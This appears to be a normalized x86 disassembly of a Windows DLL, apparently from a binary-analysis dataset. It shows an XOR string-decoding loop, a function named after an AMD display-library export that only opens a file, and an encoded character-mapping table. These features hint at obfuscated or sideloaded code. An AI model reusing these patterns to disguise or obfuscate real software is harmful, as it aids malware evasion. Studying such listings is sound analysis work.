mov [ ebp - 0x4 ] 0x2
lea edx [ ebp - 0x3c ]
mov [ ebp - 0x3c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1b0 ]
call eax
mov eax [ ebp - 0x3c ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x3
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xfc ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x4c ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
test eax eax
mov eax [ ebp - 0x40 ]
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x38 ] ebx
sub_10042b70
push ebp
mov ebp esp
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx 0x3
mov [ ebp - 0xb4 ] eax
xor eax eax
push ebx
mov [ ebp - 0xb8 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x14 ] dx
push esi
mov [ ebp - 0xac ] eax
mov [ ebp - 0xb0 ] eax
lea edx [ eax + 0x1 ]
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x6c
and esi 0xff
mov [ ebp + eax * 2 - 0x38 ] si
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x24 ] ax
mov esi [ ecx ]
lea eax [ ebp - 0xac ]
push eax
push r--data
lea eax [ ebp - 0x38 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xac ]
jns r-xdata
lea edx [ ebp - 0xa4 ]
mov [ ebp - 0xa4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x102
call sub_10053240
mov ebx [ ebp - 0xb8 ]
mov esi [ ebx + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xa4 ]
push edx
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xe
jmp r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0xe6
call sub_10053240
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x14 ]
mov eax 0x68
call sub_10053240
mov esi [ ebx + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xa4 ]
push ecx
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xf7
jmp r-xdata
call sub_10053240
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0xa8 ]
push edx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xa8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xa8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x48
jmp r-xdata
mov eax [ ebp - 0xac ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xa4 ] 0x0
lea edx [ ebp - 0x50 ]
mov eax 0x26
call sub_10053240
mov esi [ ebp - 0xa8 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xa4 ]
push edx
push edi
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xa8 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xb4 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xb0 ]
push ecx
mov ecx [ ebp - 0xac ]
push ecx
push eax
call edx
mov eax [ ebp - 0xb0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x12
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0xd4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xb0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa4 ]
test eax eax
je r-xdata
sub_10042de2
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10042e70
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x20 ]
mov edx [ esi + 0x24 ]
mov [ esi ] eax
mov eax [ esi + 0x28 ]
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] edx
mov [ esi + 0x1c ] eax
call sub_1007e670
pop esi
pop ebp
retn
ADL2_Display_SplitDisplay_Caps
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push 0x0
push 0x0
push 0x0
push eax
call [ SetFilePointer@IAT ]
call [ GetLastError@IAT ]
lea eax [ eax + eax - 0xa ]
retn
sub_10042ed5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov ecx [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
jne r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10001000
mov eax [ ebp + 0x8 ]
leave
retn 0x4
lea ecx [ eax + 0x1c ]
sub_10042efb
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10042f90
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d48
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10060b30
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x28 ]
push 0x20
mov ecx ebx
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_10069747
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_10043037
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_10017e58
mov [ eax ] ebx
call sub_1006299d
mov [ eax ] 0x9
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_10017e58
mov [ eax ] ebx
call sub_1006299d
mov [ eax ] 0x9
jmp r-xdata
call sub_10017e58
mov [ eax ] ebx
call sub_1006299d
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_100427ff
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_1002fb6b
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1004846a
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1006299d
mov [ eax ] 0xc
call sub_10017e58
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_1001e7b9
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1006299d
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_1004846a
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1004846a
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_1004846a
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_10043600
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xadb2ec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x60
mov [ ebp - 0x4 ] 0x84b3ea
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3c
mov [ ebp - 0x4 ] 0x81a0ec
call sub_1003f500
mov [ eax ] 0x3e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbc9cec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x9ca1eb
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7e
mov [ ebp - 0x4 ] 0x9890eb
call sub_1003f500
mov [ eax ] 0x23
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8092ed
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0xac97ec
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x5c
mov [ ebp - 0x4 ] 0x90a7eb
call sub_1003f500
mov [ eax ] 0x3b
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb09aec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0x848feb
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x5e
mov [ ebp - 0x4 ] 0xac82ec
call sub_1003f500
mov [ eax ] 0x61
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbcb3ea
call sub_1003f500
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x98bdec
push ecx
mov ecx rw-data
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x63
mov [ ebp - 0x4 ] 0xb682ec
call sub_1003f500
mov [ eax ] 0x64
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x88a7eb
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0xb49aec
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x66
mov [ ebp - 0x4 ] 0xb88aed
call sub_1003f500
mov [ eax ] 0x67
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x85b1ec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0xa498ec
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x69
mov [ ebp - 0x4 ] 0x8ca0eb
call sub_1003f500
mov [ eax ] 0x6a
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x80a7ec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0xb98beb
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6c
mov [ ebp - 0x4 ] 0xbcb7ea
call sub_1003f500
mov [ eax ] 0x6d
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x909eec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0x998feb
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6f
mov [ ebp - 0x4 ] 0xa8b0ec
call sub_1003f500
mov [ eax ] 0x70
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c9dec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9d8bec
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x72
mov [ ebp - 0x4 ] 0xbcaceb
call sub_1003f500
mov [ eax ] 0x73
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb094eb
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x849cec
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x75
mov [ ebp - 0x4 ] 0xb082ec
call sub_1003f500
mov [ eax ] 0x76
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbb9ceb
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0x9c95ed
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x78
mov [ ebp - 0x4 ] 0x81b6ea
call sub_1003f500
mov [ eax ] 0x79
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x95a0ec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0x989dec
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x31
mov [ ebp - 0x4 ] 0xa09cec
call sub_1003f500
mov [ eax ] 0x32
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa5a0eb
call sub_1003f500
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xa493eb
push ecx
mov ecx rw-data
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x34
mov [ ebp - 0x4 ] 0x8495ec
call sub_1003f500
mov [ eax ] 0x35
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb49dec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0xb496ec
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x37
mov [ ebp - 0x4 ] 0xb8a8eb
call sub_1003f500
mov [ eax ] 0x38
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x888beb
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0xbc9deb
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x30
mov [ ebp - 0x4 ] 0x948aeb
call sub_1003f500
mov [ eax ] 0x3a
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x83b2ea
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0x849dec
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2e
mov [ ebp - 0x4 ] 0x9c8bec
call sub_1003f500
mov [ eax ] 0x3f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb89dec
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x26
mov [ ebp - 0x4 ] 0x9895ed
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2d
mov [ ebp - 0x4 ] 0xa48beb
call sub_1003f500
mov [ eax ] 0x5f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb0b8ea
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xb781e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x60
mov [ ebp - 0x4 ] 0x8881e3
call sub_1003f500
mov [ eax ] 0x3c
